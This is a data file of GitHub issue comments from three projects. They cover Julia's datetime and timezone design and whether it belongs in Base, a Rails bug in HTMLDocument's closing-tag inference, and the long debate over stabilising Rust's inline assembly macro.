julia/JuliaLang/3524/20704605,3524,"Ok, I added  to METADATA and a README to the package repo, so hopefully more can try it out, kick tires, give it a whirl. I added a  file that runs common operations  times and returns the results. I also included a  file that was my baseline for comparing with the  package. Overall, I'm really pleased with how far the performance has come. @friend's profiler was a great help (and hopefully on windows soon?). Performance-wise,  is either on-par or faster on almost every benchmark. The remaining performance issues are when timezones are specified. I'd say it's at an acceptable/working level (compared to the first draft), but still 2x-4x slower than Calendar.jl. Right now, the timezone data is serialized in matrices for each timezone in the  folder and loaded as the timezone is called for (I like this approach because it manages memory better than slurping the entire db into memory to hold while the user works with timezones). The problem is that with certain timezones, its matrix is 100+ rows and currently, a simple linear search is used to do the lookup. I'm positive some kind of binary/trie/radix/indexed implementation would really help, but I'm actually not very experience with some of these advanced data structures/algorithms to try it out. I'd appreciate anyone's input here. Anyway, it's been a ton of fun working on this stuff and I've really enjoyed how much I've learned about bitstypes and type parameters through the process; it's definitely expanded my understanding on how Julia works and the potential there really is thru the type system. Feedback welcome! ",,False
julia/JuliaLang/3524/20723143,3524,"This is really quite amazing. I am a bit taken for the moment, but will certainly jump into this in the next few days. ",,False
julia/JuliaLang/3524/21011823,3524,"Vacations are always nice to mull things over. I've thought a lot about the Datetime stuff and particularly about timezone/leap second support and how to do it in a way that's both efficient and maintainable. Here's what I'd like to propose  Including something along the lines of the new Datetime2 package; it includes a simple  and Zulu/UTC-based  implementations (plus support for  types, , , etc.). The code is fast, efficient (~400 lines of code), and provides a lot of date/time functionality without having to deal with any timezone/leap second business. The other main factor here is that this code isn't likely to change (other than normal optimizations, tweaks, etc.).  The creation of a  package (that could possibly live in the JuliaLang organization). This package would include timezone and leap second support similar to what I've pushed in the original  package mentioned earlier in this thread. It would be fully compatible with  code and really just extend it for the additional functionality. The main driving force for splitting this functionality into a separate package that a user would add thru the package manager is maintainability. Leap seconds are announced no more than 6 months before one occurs (either the end of June or end of December). This would fly while Julia is pre-1.0, but imagine if companies are eventually anchoring to v1.0 or v2.0 and new leap seconds are added while a new Julia version is more than 6 months away. It's the same issue with timezone information. The Olson tz database is updated regularly, much more frequently than Julia language releases. Splitting timezone data/functionality into it's own package allows the package to maintain a similar release cadence with Julia, but also include its own ""updates"" to its release branches when they happen, without the fear of breaking user's code.   Feel free to check out the new Datetime2 package (it's really fast!), and I'd love to hear everybody's thoughts on the proposal. ",,False
julia/JuliaLang/3524/21013491,3524,"I really appreciate how much thought you've put into this. I think that @friend is the other person here with the most expertise in date and time stuff, and @friend has also done a lot of work on this stuff, so I defer to your collective judgements, but that sounds like a sound plan to me. ",,False
julia/JuliaLang/3524/21019382,3524,"I've started using this and think it would be great to have in Base. Getting this finalized will still take some work, but this is very close to the kind of design I'd like to see (as a person without any detailed expertise in time representations). ",,False
julia/JuliaLang/3524/21127444,3524,"Neat stuff! I have some reservations about the API, however, in particular the way periods are handled. Eager down-conversion, e.g.,  feels like a mistake. It's an approximation, and it makes period arithmetic non-associative I also don't think splitting the package in two is a great idea. ",,False
julia/JuliaLang/3524/21131127,3524,"@friend, can you elaborate more on why you think splitting the package in two is a bad idea? I agree that at first glance, it seems unintuitive and a little weird, but I think the advantages I mentioned in having always-up-to-date timezone/leap second information is a major win. w.r.t timezones, every other major datetime package (Joda, Noda, etc.) ships with a static repo of the timezone data and details a long, complicated download-reformat-recompliation process for manually updating. And for leap seconds, I would argue that we shouldn't support leap seconds in Base under any circumstance. The fact that a new leap second can occur within 6 months would quickly render a static release useless (imagine running a server logging timestamps, expecting leap second support). We'd put ourselves in the same camp as Joda/Noda detailing a manual update process that would surely turn off users. With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. As for the period arithmetic, I agree that there's a possible gotcha, but there's also not a clear solution without losing some expected behavior or have inconsistencies (e.g. not allow years/months, but allow days). I see a few options  Keep it as is, with default conversions (365 days in a year, etc.) and be upfront/explicit about it and possible gotchas associated with leap years and year + date arithmetic. Note that any  operation already results in an error.  Get rid of inter-period conversions. Then your first example above would calculate the same, but the 2nd, with years(4) + days(1) in parenthesis, would result in an error. Provide a warning/message any time a conversion happens; I initially did this and included months, but it was pretty annoying and probably not a good way to go. Do the same as 2, but also provide a  type (basically a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done.  ",,False
julia/JuliaLang/3524/21143921,3524,"I agree with all of this. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". Splitting Datetime and merging part of it into Base is liable to create two tightly-coupled modules with different release schedules. So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. This is also what Calendar does, so it's the solution i prefer. But if Datetime remains a package, then you're free to implement the solution you prefer. ",,False
julia/JuliaLang/3524/21151054,3524,"I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend 's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises  quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. ",,False
julia/JuliaLang/3524/21155474,3524,"On Jul 17, 2013 253 PM, ""Mike Nolta"" notifications@friend.com wrote two is a bad idea? ... With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. proposition ""we shouldn't merge Datetime into Base"". two tightly-coupled modules with different release schedules. I'm not sure I follow/understand you here. It would probably be clearer if the DateExtensions package existed already, but what I meant to convey earlier and what I forsee is a tightly controlled interaction between the DateTime module in base and the DateExtensions package. The base module would release along with the rest of Julia base, and the DateExtensions would follow the same schedule for any major updates (though I don't forsee many major updates as it will mainly be a data repo). In between releases, the only updates to the DateExtensions package would be timezone and leap second data additions, which would be entirely non - breaking. Is there some concern or potential misstep I'm missing with this kind of setup? -Jacob So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done. Datetime remains a package, then you're free to implement the solution you prefer. ",,False
julia/JuliaLang/3524/21155695,3524,"It seems like the main concern about putting everything in Base is the lack of a good way to update things in a timely manner. Perhaps it's time to think outside of the box; is there any reason we couldn't use the machinery inside of Pkg to provide updates to packages that we could ship with Julia? E.g. something in between Base and ~/.julia? Either something that you can♠usingPkg.add()`, (e.g. a simple package that just comes preinstalled) or something that is automatically used a la Base. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend  's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. — Reply to this email directly or view it on GitHub",,False
julia/JuliaLang/3524/21178453,3524,Have some time this week to jump into this conversation. Great stuff. ,,False
julia/JuliaLang/3524/21196023,3524,"@friend Thanks for the details. But i read your plan and think, ""This sounds like a hassle. Why bother?"" @friend I don't really buy this argument. There are lots of important packages not in base. If Datetime is high quality, people will use it. If interop becomes a problem, we can ask maintainers to switch. Maybe i'm wrong, but my gut feeling is that the benefit of including this in base is modest at best, and not worth the cost of splitting up the package. ",,False
julia/JuliaLang/3524/21198424,3524,"I agree with most of @friend's points. Preventing fracturing of date/time representations is largely a social issue and partly a technical issue of having an official date/time package that's good enough that everyone wants to use it instead of rolling their own. The biggest argument to me for having a time representation in base is that we might want to have functions in base return objects of that type. The  function, for example. But I'm not sure if those should just use float seconds since epoch or whatever. ",,False
julia/JuliaLang/3524/21253512,3524,"R has some experience iterating through ways of dealing with time and there is a good man page at  which is pretty long to post here (I'll do it if someone wants it). I think base would be well-served to have at least a foundational time-based type. It can have a timezone field that defaults to  so those data objects that don't need low latency (ie, daily, monthly, yearly) can use it. This time type can then be tagged as an  in a  and will be a path to plotting basic time series. Being able to plot seasonal monthly birth rates from a DataFrame should be available out of the box (base) while those who want more precision and ability to aggregate across specific time periods can access a package. ",,False
julia/JuliaLang/3524/21257696,3524,"So after having a go at splitting the  package into two, I have to admit that @friend was right in that it would probably be too much of a hassle. Turns out the actual implementation of having two modules try and be tightly linked is pretty tricky without straight up redefining/overriding exact methods, which doesn't seem like a great user experience (if a workaround to #265 comes about, this could probably be managed). So while splitting the package in two conceptually seems like a great idea for maintainability, practically it doesn't seem to be the best solution. I've merged the revised/enhanced codebase of  into  now and will plan on deleting the  repository. My plan is to keep testing/enhancing  (I actually just pushed temporal expression support which ends up being very natural through using anonymous functions as the ""step"" in a DateRange; see the bottom of the README). I'm happy to help support anything that would like to be included in Base, otherwise,  can continue to be its own package. ",,False
julia/JuliaLang/3524/21258764,3524,"@friend @friend  Well, to me the notion of a programming language without date/time support in its standard library seems incomplete. I suppose in the same way a language without BLAS/LAPACK support will seem incomplete to most Julia users. So I would want some kind of date time module in base. But, at the end of day, that's a pretty subjective opinion. ",,False
julia/JuliaLang/3524/21264006,3524,"Yes, but things can develop outside and be brought into Base later. ",,False
julia/JuliaLang/3524/21267164,3524,"Good point. We haven't gotten beyond 0.2 yet. How about a milestone, say by 0.5? ",,False
julia/JuliaLang/3524/23521652,3524,"Re @friend thinking outside the box. If DateTime moves into base, the issues regarding keeping the leap seconds and timezone information up to date come to the forefront.  What if there was a package like , that contained  and a  file, which is installed by default, and possibly auto-updated on julia start (in  by default, so it is easy to turn off?).  That could provide a nice way to keep this information, and possibly other information on a similar release schedule, up to date, and separate from stable code. Or the first call to a function that uses  prints a line warning that it is out of date, sort of like deprecated functions. ",,False
julia/JuliaLang/3524/23521877,3524,"@friend, that's a great idea! And we've actually been discussing doing just that over here. I just pushed some changes the other day that should allow us to do this. ",,False
julia/JuliaLang/3524/23522597,3524,Auto-updating anything is not ok. You can't start julia and have it make network connections you didn't ask for. In general anything like that should be opt-in not opt-out. ,,False
julia/JuliaLang/3524/23522615,3524,I think including the data updates in point releases is probably fine. ,,False
julia/JuliaLang/3524/23523054,3524,"Good clarification @friend. Yes, we wouldn't be pushing anything automatically, but it could still be as simple as installing an  package that could be manually updated with  and the timezone/leap second data would refresh. ",,False
julia/JuliaLang/3524/49394204,3524,Reopening; this was closed by the accidental bizarro-merge in #7825. ,,False
rails/rails/7896/7470893,7896,"HTMLDocument.new(""&lt;body&gt;&lt;br /&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;br /&gt;&lt;/body&gt;""  Note that in the above example, the closing \&lt;/body&gt; tag is correctly inferred.  To be consistent, HTMLDocument should behave with HTMLDocument.new(""&lt;body&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;/body&gt;""  However, the actual output is &lt;body&gt;  This is the root cause of the fact that testing failed to catch #7894. ",,False
rails/rails/7896/9290278,7896,what's this about? Can you add description to this so people can understand what you are talking about? ,,False
rails/rails/7896/9303106,7896,"After investigating the issue included with this PR, I saw that  returns invalid html because it does not close the -tag with . ♠&lt;%= form_tag '/posts' %&gt;form_tag` with an empty string though, wouldn't it be better to enforce people passing a block when using this helper? ",,False
rails/rails/7896/9308263,7896,"Ayrton,  I came across the bug in #7894 because I was trying to use  without a block, which is not the same as without an action (i.e. '/posts').  It's not for you to judge ""why anyone would want"" to do this--there are legitimate uses, and enforcing that people should only be able to use form_tag in the ways that an individual programmer was able to think up is not a very open-source attitude.  Why should I be limited to generating the form element's children on the server when sometimes it's more practical to use Javascript?  Your comments are not pertinent to this issue and should have been posted on #7894.  If you'd like to begin a discussion there, I'd be happy to explain to you why form_tag should not require a block or an action.   ",,False
rails/rails/7896/9317417,7896,Closing this in favor of #7894 ,,False
rails/rails/7896/9317864,7896,"vijaydev, could you clarify what ""closing in favor of"" means?  It sounds to me like that means you're not going to pull this fix.  #7894 is a distinct issue.  Fixing it doesn't fix this issue, though fixing this issue makes it possible to test #7894. ",,False
rails/rails/7896/9319184,7896,"I mean, let's have one issue/PR where the whole thing is sorted out. You've anyway made a single PR which apparently fixes both issues. ",,False
rails/rails/7896/9319304,7896,"Yes, since #7896 blocked testing of #7894 but could be fixed in isolation, I thought it made sense to wrap them in a single PR but two separate commits.  Was that the right move? ",,False
rails/rails/7896/9319378,7896,that's fine. ,,False
rust/rust-lang/29722/115921650,29722,"This issue tracks stabilization of inline assembly. The current feature has not gone through the RFC process, and will probably need to do so prior to stabilization. ",,False
rust/rust-lang/29722/155362102,29722,Will there be any difficulties with ensuring the backward-compatibility of inline assembly in stable code? ,,False
rust/rust-lang/29722/207592418,29722,@friend has a great comment at  that I'm reproducing here for posterity ,,False
rust/rust-lang/29722/207625252,29722,"I personally think it would be better to do what Microsoft did in MSVC x64 define a (nearly-)comprehensive set of intrinsic functions, for each asm instruction, and do ""inline asm"" exclusively through those intrinsics. Otherwise, it's very difficult to optimize the code surrounding inline asm, which is ironic since many uses of inline asm are intended to be performance optimizations. One advantage of the instrinsic-based approach is that it doesn't need to be an all-or-nothing thing. You can define the most needed intrinsics first, and build the set out incrementally. For example, for crypto, having , . Note that the work to do the instrinsics seems to have been done quite thoroughly already  the intrinsics would be a good idea to add even if it were ultimately decided to support inline asm, as they are much more convenient to use (based on my experience using them in C and C++), so starting with the intrinsics and seeing how far we get seems like a zero-risk-of-being-wrong thing. ",,False
rust/rust-lang/29722/207628164,29722,"Intrinsics are good, but  can be used for more than just inserting instructions. For example, see the way I'm generating ELF notes in my  crate.  expect that kind of hackery will be rare, but I think it's still a useful thing to support. ",,False
rust/rust-lang/29722/207823543,29722,@friend Inline asm is also useful for code that wants to do its own register/stack allocation (e.g. naked functions). ,,False
rust/rust-lang/29722/207841310,29722,@friend yeah those are some excellent reasons to use intrinsics where possible. But it's nice to have inline assembly as the ultimate excape hatch. ,,False
rust/rust-lang/29722/207868039,29722,"@friend Note that  is kind of a superset of intrinsics as you can build the latter using the former. (The common argument against this reasoning is that the compiler could theoretically optimize through intrinsics, e.g. hoist them out of loops, run CSE on them, etc. However, it's a pretty strong counterpoint that anyone writing asm for optimization purposes would do a better job at that than the compiler anyways.) See also  and  for cases where inline asm works but intrinsics don't. On the other hand, intrinsics critically depend on a ""sufficiently smart compiler"" to achieve at least the performance one would get with a hand-rolled asm implementation. My knowledge on this is outdated but unless there has been significant progress, intrinsics-based implementations are still measurably inferior in many - if not most - cases. Of course they're much more convenient to use but I'd say that programmers really don't care much about that when they're willing to descend into the world of specific CPU instructions. Now another interesting consideration is that intrinsics could be coupled with fallback code on architectures where they're not supported. This gives you the best of both worlds Your code is still portable - it's can just employ some hardware accelerated operations where the hardware supports them. Of course this only really pays off for either very common instructions or if the application has one obvious target architecture. Now the reason why I'm mentioning this is that while one could argue that this may potentially even be undesirable with compiler-provided intrinsics (as you'd probably care about whether you actually get the accelerated versions plus compiler complexity is never good) I'd say that it's a different story if the intrinsics are provided by a library (and only implemented using inline asm). In fact, this is the big picture I'd prefer even though I can see myself using intrinsics more than inline asm. (I consider the intrinsics from RFC #1199 somewhat orthogonal to this discussion as they exist mostly to make SIMD work.) ",,False
rust/rust-lang/29722/220396970,29722,"@friend I'm not sure what you mean here. It's true that the compiler can't break down the asm into its individual operations to do strength reduction or peephole optimizations on it. But in the GCC model, at least, the compiler can allocate the registers it uses, copy it when it replicates code paths, delete it if it's never used, and so on. If the asm isn't volatile, GCC has enough information to treat it like any other opaque operation like, say, . The whole motivation for the weird design is to make inline asm something the optimizer can mess with. But I haven't used it a whole lot, especially not recently. And I have no experience with LLVM's rendition of the feature. So I'm wondering what's changed, or what I've misunderstood all this time. ",,False
rust/rust-lang/29722/313146254,29722,"We discussed this issue at the recent work week as @friend's survey of the  ecosystem has the  macro as one of the more commonly used features. Unfortunately we didn't see an easy way forward for stabilizing this feature, but I wanted to jot down the notes we had to ensure we don't forget all this.  First, we don't currently have a great specification of the syntax accepted in the  macro. Right now it typically ends up being ""look at LLVM"" which says ""look at clang"" which says ""look at gcc"" which doesn't have great docs. In the end this typically bottoms out at ""go read someone else's example and adapt it"" or ""read LLVM's source code"". For stabilization a bare minimum is that we need to have a specification of the syntax and documentation.  Right now, as far as we know, there's no stability guarantee from LLVM. The  macro is a direct binding to what LLVM does right now. Does this mean that we can still freely upgrade LLVM when we'd like? Does LLVM guarantee it'll never ever break this syntax? A way to alleviate this concern would be to have our own layer that compiles to LLVM's syntax. That way we can change LLVM whenever we like and if the implementation of inline assembly in LLVM changes we can just update our translation to LLVM's syntax. If  is to become stable we basically need some mechanism of guaranteeing stability in Rust.  Right now there are quite a few bugs related to inline assembly. The A-inline-assembly tag is a good starting point, and it's currently littered with ICEs, segfaults in LLVM, etc. Overall this feature, as implemented today, doesn't seem to live up to the quality guarantees others expect from a stable feature in Rust.  Stabilizing inline assembly may make an implementation of an alternate backend very difficult. For example backends such as miri or cretonne may take a very long time to reach feature parity with the LLVM backend, depending on the implementation. This may mean that there's a smaller slice of what can be done here, but it's something important to keep in mind when considering stabilizing inline assembly.    Despite the issues listed above we wanted to be sure to at least come away with some ability to move this issue forward! To that end we brainstormed a few strategies of how we can nudge inline assembly towards stabilization. The primary way forward would be to investigate what clang does. Presumably clang and C have effectively stable inline assembly syntax and it may be likely that we can just mirror whatever clang does (especially wrt LLVM). It would be great to understand in greater depth how clang implements inline assembly. Does clang have its own translation layer? Does it validate any input parameters? (etc) Another possibility for moving forward is to see if there's an assembler we can just take off the shelf from elsewhere that's already stable. Some ideas here were nasm or the plan9 assembler. Using LLVM's assembler has the same problems about stability guarantees as the inline assembly instruction in the IR. (it's a possibility, but we need a stability guarantee before using it) ",,False
rust/rust-lang/29722/313157833,29722,"I would like to point out that LLVM's inline asm syntax is different from the one used by clang/gcc. Differences include  LLVM uses  instead of . LLVM doesn't support named asm operands . LLVM supports different register constraint types for example  instead of  on x86. LLVM support explicit register constraints (). In C you must instead use register asm variables to bind a value to a register (). LLVM  and  constraints are basically broken. Clang translates these into indirect memory constraints  and  and pass the address of the variable to LLVM instead of the variable itself. etc...  Clang will convert inline asm from the gcc format into the LLVM format before passing it on to LLVM. It also performs some validation of the constraints for example it ensures that  operands are compile-time constants,  In light of this I think that we should implement the same translation and validation that clang does and support proper gcc inline asm syntax instead of the weird LLVM one. ",,False
rust/rust-lang/29722/315483709,29722,"There's an excellent video about summaries with D, MSVC, gcc, LLVM, and Rust with slides online ",,False
rust/rust-lang/29722/316808985,29722,"As someone who'd love to be able to use inline ASM in stable Rust, and with more experience than I want trying to access some of the LLVM MC APIs from Rust, some thoughts  Inline ASM is basically a copy-paste of a snippet of code into the output .s file for assembling, after some string substitution. It also has attachments of input and output registers as well as clobbered registers. This basic framework is unlikely to ever really change in LLVM (although some of the details might vary slightly), and I suspect that this is a fairly framework-independent representation.  Constructing a translation from a Rust-facing specification to an LLVM-facing IR format isn't hard. And it might be advisable--the rust  syntax for formatting doesn't interfere with assembly language, unlike LLVM's  and GCCs  notation.  LLVM does a surprisingly bad job in practice of actually identifying which registers get clobbered, particularly in instructions not generated by LLVM. This means it's pretty much necessary for the user to manually specify which registers get clobbered.  Trying to parse the assembly yourself is likely to be a nightmare. The LLVM-C API doesn't expose the MCAsmParser logic, and these classes are quite annoying to get working with bindgen (I've done it).  For portability to other backends, as long as you keep the inline assembly mostly on the level of ""copy-paste this string with a bit of register allocation and string substitution"", it shouldn't inhibit backends all that much. Dropping the integer constant and memory constraints and keeping just register bank constraints shouldn't pose any problems.   ",,False
rust/rust-lang/29722/327399847,29722,"I've been having a bit of play to see what can be done with procedural macros. I've written one that converts GCC style inline assembly to rust style  I've also started working on one that uses a DSL where the user doesn't have to understand the constraints and they're all handled automatically. So I've come to the conclusion that I think rust should just stabilise the bare building blocks, then the community can iterate out of tree with macros to come up with best solutions. Basically, just stabilise the llvm style we have now with only ""r"" and ""i""  and maybe ""m"" constraints, and no clobbers. Other constraints and clobbers can be stabilised later with their own mini rfc type things. ",,False
rust/rust-lang/29722/334013222,29722,"Personally I'm starting to feel as though stabilizing this feature is the sort of massive task that will never get done unless somehow someone hires a full-time expert contractor to push on this for a whole year. I want to believe that @friend's suggestion of stabilizing  piecemeal will make this tractable. But if it isn't, then we need to stop trying to reach for the satisfactory solution that will never arrive and reach for the unsatisfactory solution that will stabilize  as-is, warts, ICEs, bugs and all, with bright bold warnings in the docs advertising the jank and nonportability, and with the intent to deprecate someday if a satisfactory implementation should ever miraculously descend, God-sent, on its heavenly host. IOW, we should do exactly what we did for  (and of course, just like for , we can have a brief period of frantic band-aiding and leaky future-proofing). I'm sad at the ramifications for alternative backends, but it's shameful for a systems language to relegate inline assembly to such a limbo, and we can't let the hypothetical possibility of multiple backends continue to obstruct the existence of one actually usable backend. ",,False
rust/rust-lang/29722/334027658,29722,"As a data point, I happen to be working on a crate right now that depends on  for the sole purpose of emitting some asm with stable Rust  it certainly has its advantages, I'm a bit wary of the ""stabilize building blocks and leave the rest to proc-macros""-approach. It essentially outsources the design, RFC and implementation process to whoever wants to do the job, potentially no one. Of course having weaker stability/quality guarantees is the entire point (the tradeoff is that having something imperfect is already much better than having nothing at all), I understand that. At least the building blocks should be well-designed - and in my opinion,  definitely isn't. I can't remember ever getting the order right on the first try, I always have to look it up. ""Magic categories separated by colons where you specify constant strings with magic characters that end up doing magic things to the variable names that you also just mash in there somehow"" is just bad. ",,False
rust/rust-lang/29722/334134492,29722,"One idea, … Today, there is already a project, named dynasm, which can help you generate assembly code with a plugin used to pre-process the assembly with one flavor of x64 code. This project does not answer the problem of inline assembly, but it can certainly help, if rustc were to provide a way to map variables to registers, and accept to insert set of bytes in the code, such project could also be used to fill-up these set of bytes. This way, the only standardization part needed from rustc point of view, is the ability to inject any byte sequence in the generated code, and to enforce specific register allocations.  This removes all the choice for specific languages flavors. Even without dynasm, this can also be used as a way to make macros for the cpuid / rtdsc instructions, which would just be translated into the raw sequence of bytes. I guess the next question might be if we want to add additional properties/constraints to the byte-sequences. ",,False
rust/rust-lang/29722/334237425,29722,"If we want to continue to use LLVM's integrated assembler (I assume this is faster than spawning an external assembler), then stabilization means stabilizing on exactly what LLVM's inline assembly expressions and integrated assembler support&mdash;and compensating for changes to those, should any occur. If we're willing to spawn an external assembler, then we can use any syntax we want, but we're then foregoing the advantages of the integrated assembler, and exposed to changes in whatever external assembler we're calling. ",,False
rust/rust-lang/29722/334239773,29722,"I think it would be strange to stabilize on LLVM's format when even Clang doesn't do that.  Presumably it does use LLVM's support internally, but it presents an interface more like GCC. ",,False
rust/rust-lang/29722/334352867,29722,"I'm 100% fine with saying ""Rust supports exactly what Clang supports"" and calling it a day, especially since AFAIK Clang's stance is ""Clang supports exactly what GCC supports"". If we ever have a real Rust spec, we can soften the language to ""inline assembly is implementation-defined"". Precedence and de-facto standardization are powerful tools. If we can repurpose Clang's own code for translating GCC syntax to LLVM, all the better. The alternative backend concerns don't go away, but theoretically a Rust frontend to GCC wouldn't be much vexed. Less for us to design, less for us to endlessly bikeshed, less for us to teach, less for us to maintain. ",,False
rust/rust-lang/29722/334537584,29722,"If we stabilize something defined in terms of what clang supports, then we should call it . The  name should be reserved for something that's been designed through a full RFC process, like other major Rust features. #bikeshed There are a bunch of things I'd like to see in Rust inline assembly  The template-with-substitutions pattern is ugly. I'm always jumping back and forth between the assembly text and the constraint list. Brevity encourages people to use positional parameters, which makes legibility worse. Symbolic names often mean you have the same name repeated three times in the template, naming the operand, and in the expression being bound to the operand. The slides mentioned in Alex's comment show that D and MSVC let you simply reference variables in the code, which seems much nicer.  Constraints are both hard to understand, and (mostly) redundant with the assembly code. If Rust had an integrated assembler with a sufficiently detailed model of the instructions, it could infer the constraints on the operands, removing a source of error and confusion. If the programmer needs a specific encoding of the instruction, then they would need to supply an explicit constraint, but this would usually not be necessary.   Norman Ramsey and Mary Fernández wrote some papers about the New Jersey Machine Code Toolkit way back when that have excellent ideas for describing assembly/machine language pairs in a compact way. They tackle (Pentium Pro-era) iA-32 instruction encodings; it is not at all limited to neat RISC ISAs. ",,False
rust/rust-lang/29722/334544675,29722,"I'd like to reiterate again the conclusions from the most recent work week  Today, as far as we know, there's basically no documentation for this feature. This includes LLVM internals and all. We have, as far as we know, no guarantee of stability from LLVM. For all we know the implementation of inline assembly in LLVM could change any day. This is, currently, a very buggy feature in rustc. It's chock full of (at compile time) segfaults, ICEs, and weird LLVM errors. Without a specification it's nigh impossible to even imagine an alternate backend for this.  To me this is the definition of ""if we stabilize this now we will guarantee to regret it in the future"", and not only ""regret it"" but seems very likely for ""causes serious problems to implement any new system"". At the absolute bare minimum I'd firmly believe that bullet (2) cannot be compromised on (aka the definition of stable in ""stable channel""). The other bullets would be quite sad into forgo as it erodes the expected quality of the Rust compiler which is currently quite high. ",,False
rust/rust-lang/29722/334548120,29722,"@friend wrote I would think that, in practice, it would be quite difficult to infer clobber lists. Just because a machine-language fragment uses a register doesn't mean it clobbers it; perhaps it saves it and restores it. Conservative approaches could discourage the code generator from using registers that would be fine to use. ",,False
rust/rust-lang/29722/334659265,29722,"@friend wrote The LLVM docs guarantee ""Newer releases can ignore features from older releases, but they cannot miscompile them."" (with respect to IR compatibility). That rather constrains how much they can change inline assembly, and, as I argued above, there's not really any viable replacement at LLVM level that would radically change semantics from the current situation (unlike, say, the ongoing issues around poison and undef). Saying that its prospective instability precludes using it as a base for a Rust  block is therefore somewhat dishonest. Now that's not to say there are other problems with it (poor documentation, although that has improved; constraint suckiness; poor diagnostics; and bugginess in less-common scenarios are ones that come to mind). My biggest worry in reading the thread is that we make the perfect be the enemy of the good. In particular, I worry that searching for some magic DSL intermediary is going to take a few years to try to wrangle into usable form for inline-asm as people discover that integrating asm parsers and trying to get them to work with LLVM's cause more problems in edge cases. ",,False
rust/rust-lang/29722/334670979,29722,"Are LLVM really guaranteeing that they'll never miscompile a feature whose behavior they've never specified? How would they even decide if a change was a miscompilation or not? I could see it for the other parts of the IR, but this seems like a lot to expect. ",,False
rust/rust-lang/29722/334677518,29722,"Clang doesn't do that because it aims to be able to compile code that was written for GCC. rustc doesn't have that aim. The GCC format isn't very ergonomic so ultimately I think we don't want that, but whether that would be better to go with for now I'm unsure. There's a lot of (nightly) code out there using the current Rust format that would break if we changed to GCC style so it's probably only worth changing if we can come up with something notably better. Agreed. At the very least I prefer the raw LLVM format where the constraints and clobbers are all in one list. Currently there is a redundancy having to specify ""="" prefix and put it in the output list. I also think how LLVM treats it more like a function call where the outputs are the result of the expression, AFAIK the current  implementation is the only part of rust that has ""out"" parameters. AFAIK LLVM doesn't event try to do this as the main reason for inline assembly is to include some code that LLVM doesn't understand. It only does register allocation and template substitution without looking at the actual assembly.  (Obviously it parses the actually assembly at some stage to generate the machine code, but I think that happens later) I'm not sure there can ever be an alternative to using the integrated inline assembler because some how you would have to get LLVM to allocate registers for it. For global assembly though, an external assembler would be workable. Regarding breaking changes in the LLVM inline assembler, we are in the same boat as Clang. That is, if they make some changes, we just have to work around them when they happen. ",,False
rust/rust-lang/29722/334915420,29722,"I'm all for it. plus one @friend Going by @friend 's suggestion quoted above, anyone using  will happily be able to still use it. If GCC's assembly syntax is truly not specified or documented after 30 years, then it seems safe to assume that either producing a documented assembly sublanguage is a task that is either so difficult that it is beyond Rust's ability to accomplish given our limited resources, or that people who want to use assembly simply don't care. It seems unlikely that GCC/Clang's implementation of inline assembly will ever change, since that would break all C code written since the 90s. At the risk of being callous, the prospect of alternative backends is moot if Rust as a language does not survive due to its embarrassing inability to drop into assembly. Nightly does not suffice, unless one wants to tacitly endorse the idea that Nightly is Rust, which does more to undermine Rust's stability guarantee than the prospect of LLVM changes. I'm not lying when I say that every day I am thankful for the attitude of the Rust developers and the enormous standard of quality that they hold themselves to (in fact sometimes I wish y'all would slow down so you can maintain that quality without burning yourselves out like Brian did). However, speaking as someone who was here when luqmana added the  macro four years ago, and who has observed no progress since then at getting this stabilized, and who is sad that crypto in Rust is still impossible and that SIMD in Rust doesn't even have a workaround while the cross-platform interface is being slowly determined, I feel despondent. If I seem emphatic here it's because I view this issue as existential to the survival of the project. It may not be a crisis right this moment, but it will take time to stabilize anything at all, and we don't have the years that it will take to design and implement a world-class assembly dialect from scratch (proven by the fact that we have made no progress towards this in the last four years). Rust needs stable inline assembly sometime in 2018. We need prior art to pull that off. The  situation acknowledged that sometimes worse is better. Once again, I'm begging someone to prove me wrong. ",,False
rust/rust-lang/29722/337823950,29722,"FWIW and coming late to the party I like what @friend 's the cologne talk proposed. For those that haven't watched it, this is the gist of it ",,False
rust/rust-lang/29722/346313816,29722,"How about the following strategy rename current  to  (plus maybe some minor changes) and state that it's behavior is implementation detail of LLVM, thus Rust stability guarantee does not fully extend to it? Problem of different backends should be more or less solved with  like functionality for conditional compilation depending on the used backend. Yes, such approach will blur Rust stability a bit, but keeping assembly in limbo like this is damaging for Rust in its own way. ",,False
rust/rust-lang/29722/354862160,29722,I've posted a pre-RFC with an alternative syntax proposal to the internals forum  Feedback welcome. ,,False
